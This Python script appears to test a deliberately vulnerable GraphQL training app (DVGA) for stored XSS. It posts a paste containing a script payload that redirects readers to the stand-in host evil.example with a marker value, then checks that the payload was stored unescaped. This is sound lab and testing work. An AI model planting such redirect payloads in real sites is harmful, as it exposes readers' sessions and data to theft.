#!/usr/bin/env python3
"""
dvga_challenge_06_stored_xss.py — Stored XSS via paste content.

DVGA stores paste `content` verbatim and the paste detail page renders it
without sanitisation, so a `<script>` (or event-handler) payload stored in a
paste executes in the browser of whoever reads it.

RELIABLE signal: we create a paste whose `content` contains a unique XSS
marker, then read it back with `paste(id:)` and confirm the marker is stored
UNESCAPED. We print the marker's presence, not the full payload.
Run: python3 dvga_challenge_06_stored_xss.py [--config ...]
"""
import argparse
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="Stored XSS via paste content")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)
    hdrs = dv.consumer_headers(806)

    marker = "xss" + uuid.uuid4().hex[:8]
    payload = f"<script>document.location='http://evil.example/?c={marker}'</script>"

    r = dv.graphql(base, """
      mutation($t: String!, $c: String!) {
        createPaste(title: $t, content: $c, public: true, burn: false) { paste { id title content } }
      }
    """, {"t": "xss " + marker, "c": payload}, cfg, hdrs, tout)
    if r is None:
        print("createPaste -> transport error")
        return
    body = r.json() if r.headers.get("content-type", "").find("json") >= 0 else {}
    paste = (((body.get("data") or {}).get("createPaste") or {}).get("paste") or {})
    pid = paste.get("id")
    stored = (paste.get("content") or "")
    print(f"createPaste -> id={pid} marker_stored_on_create={'yes' if marker in stored else 'no'}")

    # Read it back to confirm persistence.
    if pid is not None:
        r2 = dv.graphql(base, "query { paste(id: %s) { id content } }" % int(pid) if str(pid).isdigit() else "query { paste(id: 1) { id content } }",
                        None, cfg, hdrs, tout)
        body2 = r2.json() if (r2 is not None and r2.headers.get("content-type", "").find("json") >= 0) else {}
        stored2 = (((body2.get("data") or {}).get("paste") or {}).get("content") or "")
        persisted = "<script" in stored2 and marker in stored2
        print(f"paste(id={pid}) -> raw_script_persisted={'yes' if persisted else 'no'}")
        print()
        if persisted:
            print("[FINDING] paste content is stored and returned unescaped — a <script> payload in a paste "
                  "will execute for every reader (stored XSS).")
        else:
            print("[ok] payload was escaped/normalised on this build (no raw <script> persisted).")
    else:
        print("[ok] could not create a paste to test persistence.")


if __name__ == "__main__":
    main()
